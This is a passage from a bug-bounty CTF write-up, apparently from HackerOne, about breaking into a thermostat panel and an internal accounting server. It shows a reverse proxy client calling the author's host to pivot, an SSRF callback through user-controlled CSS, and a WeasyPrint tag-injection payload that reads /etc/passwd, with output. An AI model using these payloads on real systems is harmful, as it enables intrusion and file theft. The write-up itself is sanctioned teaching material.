'POST':\n\t\th = request.form['hash']\n\t\tif len(h) != 64:\n\t\t\terror = True\n\t\telse:\n\t\t\tfor i in range(0, 64, 2):\n\t\t\t\ttime.sleep(0.5)\n\t\t\t\tif validLogin[i:i+2] != h[i:i+2]:\n\t\t\t\t\terror = True\n\t\t\t\t\tbreak\n\t\tif not error:\n\t\t\tsession['loggedIn'] = True\n\t\t\treturn redirect('/main')\n\n\treturn render('index', page='login', error='Invalid username or password' if error else None)\n```\n\nAt this point, I couldn't find any other interesting stuff on this box so that means we need to pivot. I also tried Docker escapes, but I [guess that wasn't the right idea, lol](https://twitter.com/daeken/status/1104857106061119489?s=19). Since we're on a LAN, let's scan for other hosts. But because we're in Docker, we can't listen on any new ports. If we'd like to pivot through this box, we need to setup a backconnect proxy server. I like to use `rpivot`.\n\n```\nroot@perfect.blue:~/rpivot# python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080\nroot@d090cd50ec64:~# cd /dev/shm\nroot@d090cd50ec64:/dev/shm# git clone https://github.com/klsecservices/rpivot\nroot@d090cd50ec64:/dev/shm# python client.py --server-ip perfect.blue --server-port 9999\n```\n\nThis lands us a nice SOCKS4 proxy. But let's upgrade this to a SOCKS5 and HTTP proxy so it's a bit comfier. Nothing pchains can't handle.\n\n```\nroot@perfect.blue:~# proxychains ../microsocks/microsocks -i 127.0.0.1 -p 1081\nroot@perfect.blue:~# hpts -s 127.0.0.1:1081 -p 8080\n```\n\nNow, we can proxychains nmap 172.25.0.0/16 for other hosts. And almost immediately, we find a neighbor on the LAN (this container restarted later so the IP address is different). And it is also listening on port 80.\n\n### (0x04) Accounting\n\nUsing the HTTP proxy we just setup, we navigate over to http://172.28.0.3/ and find this:\n\n{F440491}\n\nThis looks sensitive. Reports and Invoices are both gated behind a login page, and there is no obvious SQLi. Luckily with some directory searching we are able to find http://172.28.0.3/invoices/new:\n\n{F440493}\n\nNow we're talking! I bet this is vuln. Let's quickly glance over the source code to make sure there's no obvious problems.\n\nI checked the PDf output for metadata, because I wanted to see how the PDF was being generated. That way I could check if there were known vulnerabilities in that library.\n\n```xml\n$ dumppdf.py -a pdfize.pdf | less\n\u003cobject id=\"26\"\u003e\n\u003cdict size=\"2\"\u003e\n\u003ckey\u003eProducer\u003c/key\u003e\n\u003cvalue\u003e\u003cstring size=\"39\"\u003ecairo 1.14.8 \u0026#40;http://cairographics.org\u0026#41;\u003c/string\u003e\u003c/value\u003e\n\u003ckey\u003eCreator\u003c/key\u003e\n\u003cvalue\u003e\u003cstring size=\"39\"\u003ecairo 1.14.8 \u0026#40;http://cairographics.org\u0026#41;\u003c/string\u003e\u003c/value\u003e\n\u003c/dict\u003e\n\u003c/object\u003e\n```\n\nA quick search for \"Python web page pdf cairo\" showed the library WeasyPrint. Let's keep this in mind.\n\nNext, looking at the requests in Burp, the most interesting thing I noticed was that there was some CSS that we could control in the request parameters:\n\n```\nGET http://172.28.0.3/invoices/preview?d={\"companyName\":\"a\",\"email\":\"b\",\"invoiceNumber\":\"c\",\"date\":\"d\",\"items\":[[\"1\",\"a\",\"b\",\"10\"]],\"styles\":{\"body\":{\"background-color\":\"white\"}}}\n\nHTTP/1.1 200 OK\n...\n\t\tbody {\n\t\t\tbackground-color: white;\n\t\t}\n...\n```\n\nCan we get SSRF using this?\n\n```\nGET http://172.28.0.3/invoices/pdfize?d={\"companyName\":\"a\",\"email\":\"b\",\"invoiceNumber\":\"c\",\"date\":\"d\",\"items\":[[\"1\",\"a\",\"b\",\"10\"]],\"styles\":{\"body\":{\"background-image\":\"url('http://perfect.blue:12345/lol.png')\"}}}\n\nroot@perfect.blue:~## nc -lvp 12345\nListening on [0.0.0.0] (family 0, port 12345)\nConnection from 98.12.196.104.bc.googleusercontent.com 47690 received!\nGET /lol.png HTTP/1.1\nHost: perfect.blue:12345\nUser-Agent: WeasyPrint 44 (http://weasyprint.org/)\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: close\n\n^C\n```\n\nYup...and we now also know that it's Weasyprint. At this point, I wasted a lot of time trying to use SVG to somehow include a file URL to get LFI or to get XXE. But no dice. I also tried to use `@font-face src`.\n\nFailing that I decided to check Weasyprint's GitHub issues, and I saw [this (merged) pull request](https://github.com/Kozea/WeasyPrint/pull/177). That's golden! It's a LFI for free, if we can somehow manage to inject an `\u003ca\u003e` or `\u003clink\u003e` tag. SVG won't work for this, because Weasyprint renders SVG by handing it off to CairoSVG. So we need a way to break out of the CSS or table data into the HTML. At this point I simply tried putting `\u003c` in every field.\n\n```\nGET http://172.28.0.3/invoices/preview?d={\"companyName\":\"\u003c\",\"email\":\"\u003c\",\"invoiceNumber\":\"\u003c\",\"date\":\"\u003c\",\"items\":[[\"1\",\"\u003c\",\"\u003c\",\"1\"]],\"styles\":{\"\u003c\":{\"\u003c\":\"\u003c\"}}}\n\n\t\t\u0026lt; {\n\t\t\t\u003c: \u0026lt;;\n\t\t}\n...\n```\n\nWould you look at that...every field is sanitized **except** the CSS selector, lol. But apparently, `\u003c/style\u003e` is sanitized out. OK, so what if I make the tag malformed?\n\n```\nGET http://172.28.0.3/invoices/preview?d={\"companyName\":\"\u003c\",\"email\":\"\u003c\",\"invoiceNumber\":\"\u003c\",\"date\":\"\u003c\",\"items\":[[\"1\",\"\u003c\",\"\u003c\",\"1\"]],\"styles\":{\"\u003c\":{\"\u003c/style%20\u003c!--\":\"\u003c\"}}}\n\n\t\t\u0026lt; {\n\t\t\t\u003c/style \u003c!--: \u0026lt;;\n\t\t}\n```\n\nNice, so now we just need to inject the `\u003ca\u003e` tag and we will get LFI for free in the form of a PDF attachment.\n\n```\nGET http://172.28.0.3/invoices/pdfize?d={\"companyName\":\"a\",\"email\":\"b\",\"invoiceNumber\":\"c\",\"date\":\"d\",\"items\":[[\"1\",\"a\",\"b\",\"10\"]],\"styles\":{\"asdfasdf\":{\"\u003c/style%20\u003c!--\":\"\",\"!--\u003e\u003ca%20href=\\\"file:///etc/passwd\\\"%20rel=\\\"attachment\\\"\u003ewow\u003c/a%20\u003c!--\":\"\"}}}\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nnginx:x:101:102:nginx user,,,:/nonexistent:/bin/false\nmessagebus:x:102:103::/var/run/dbus:/bin/false\n```\n\nBoom! Pwned :)\n\nSo far all of the webapps have been at `/app` mounted in Docker. So let's just try `/app/main.py`.\n\n```python\n\"\"\"\nCONGRATULATIONS!\n\nIf you're reading this, you've made it to the end of the road for this CTF.\n\nGo to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.\nMake sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!\n\nCongratulations again, and I'm sorry for the red herrings. :)\n\"\"\"\n```\n\nNice. And just for fun, here's the crappy CSS sanitization:\n\n```python\ndef stripClosingTags(data):\n\treturn re.sub(r'\u003c\\s*/[^\u003c]+?\u003e', '', data)\n```\n\n## Supporting Material/References:\n\n{F440498}\n{F440500}\n{F440501}\n\n## Impact\n\nAn attacker could download the confidential reports and invoices on the internal \"Accounting\" server, as well as fraudulently create new Invoices. The attacker can also execute arbitrary code on the company intranet because they are able to execute code on the thermostat's administration web panel's server.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eAn attacker is able to download local files on the Accounting server due leveraging improper input sanitization in the Invoice PDF generator. In the same fashion an attacker is also able to issue server-side requests on the Accounting server through user-controlled CSS, possibly leading to further exploitation.\u003c/p\u003e\n\n\u003cp\u003eAn attacker is able to execute remote code on the FliteThermostat admin control panel\u0026#39;s server due to a command injection vulnerability. Said control panel\u0026#39;s authentication can be broken using a timing attack. Lastly, an attacker is able to read the contents of the thermostat database due to a SQL injection vulnerability.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eMany of my friends are deep into web security, but this is my first time really getting my toes wet :D\u003cbr\u003e\nI did well on h1-702-ctf last year, so I wanted to try it again this year!\u003cbr\u003e\nI will be detailing the process I took using a \u0026quot;CTF-style\u0026quot; writeup, which is probably more verbose than a usual bug-bounty writeups. Hopefully though, it will more clearly explain the thought process and intuition I followed. Plus, this is a \u0026quot;CTF\u0026quot; right?\u003c/p\u003e\n\n\u003ch3 id=\"0x00-baby-steps\"\u003e(0x00) Baby Steps.\u003c/h3\u003e\n\n\u003cp\u003eI found out about this challenge from my friend Jazzy, who linked me \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FHacker0x01%2Fstatus%2F1100543680383832065\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ethis tweet\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. To be honest, I actually didn\u0026#39;t realize that the challenge began with the image embedded with the tweet until I did more recon and found \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fdaeken%2Fstatus%2F1100634878490656768\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCody Brocious\u0026#39;s Twitter\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Then it was clear that we were supposed to look for data hidden in the image.\u003c/p\u003e\n\n\u003cp\u003eClearly there\u0026#39;s some binary text in the background. The first thing I noticed was that the data was regular, because of the equal spacing between the underscores in the image. The text wrapping leads to the formation of a linear pattern artifact.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"stego1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/492/c2f872dc92618e4fc459f46a62ecfdcfe19cdaca/stego1.png?response-content-disposition=attachment%3B%20filename%3D%22stego1.png%22%3B%20filename%2A%3DUTF-8%27%27stego1.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=5b70944f801e3c493ac5b31131dce7cb527672604580c1f5f1a855f3684214af\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/492/c2f872dc92618e4fc459f46a62ecfdcfe19cdaca/stego1.png?response-content-disposition=attachment%3B%20filename%3D%22stego1.png%22%3B%20filename%2A%3DUTF-8%27%27stego1.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=5b70944f801e3c493ac5b31131dce7cb527672604580c1f5f1a855f3684214af\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eSince each chunk seems to be the same, thankfully we only need to transcribe one reptition of this pattern, not the whole image. Transcribing this, we get the data:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e7A 6C 69 62 2B 78 9C CB 28 29 29 28 B6 D2 D7 4F  zlib+xœË())(¶Ò×O\nCA 2C D1 4B C9 D7 CF 30 2C C9 48 2D CA 05 00 5B  Ê,ÑKÉ×Ï0,ÉH-Ê..[\n4F 07 F4 7A 6C 69 62 2B 78 9C CB 28 29 29 28 B6  O.ôzlib+xœË())(¶\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe data announces that it\u0026#39;s zlib compressed, but we can also tell from the \u003ccode\u003e78 9C\u003c/code\u003e magic at offset 5. We cut off the first five bytes and decompress:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ echo \u0026quot;78 9C CB 28 29 29 28 B6 D2 D7 4F CA 2C D1 4B C9 D7 CF 30 2C C9 48 2D CA 05 00 5B 4F 07 F4 7A 6C 69 62 2B 78 9C CB 28 29 29 28 B6\u0026quot; | xxd -r -p | openssl zlib -d; echo\nhttps://bit.do/h1therm\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCool! So we have a URL to work with now. I also looked for LSB stego, which is typical for this type of challenge.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"stego2.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/489/189b9628811dcfad7154dbe6d1920464f7da0398/stego2.png?response-content-disposition=attachment%3B%20filename%3D%22stego2.png%22%3B%20filename%2A%3DUTF-8%27%27stego2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=5539b8dae1c76c9f2ca0477f65bcec1d5ddc9b28189b382016a82a11416dd403\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/489/189b9628811dcfad7154dbe6d1920464f7da0398/stego2.png?response-content-disposition=attachment%3B%20filename%3D%22stego2.png%22%3B%20filename%2A%3DUTF-8%27%27stego2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=5539b8dae1c76c9f2ca0477f65bcec1d5ddc9b28189b382016a82a11416dd403\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThere is regular data in the LSB of the red, green, and blue planes. Extracting this, we see the same data as earlier.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"stego3.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/490/e1b4e6516f457e540996176ae90d271dee1114bf/stego3.png?response-content-disposition=attachment%3B%20filename%3D%22stego3.png%22%3B%20filename%2A%3DUTF-8%27%27stego3.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=2cd5efeb02a56cd0c6e58fd7757c00ec3585efd485b3110d5efb9aa8b3d92423\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/490/e1b4e6516f457e540996176ae90d271dee1114bf/stego3.png?response-content-disposition=attachment%3B%20filename%3D%22stego3.png%22%3B%20filename%2A%3DUTF-8%27%27stego3.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5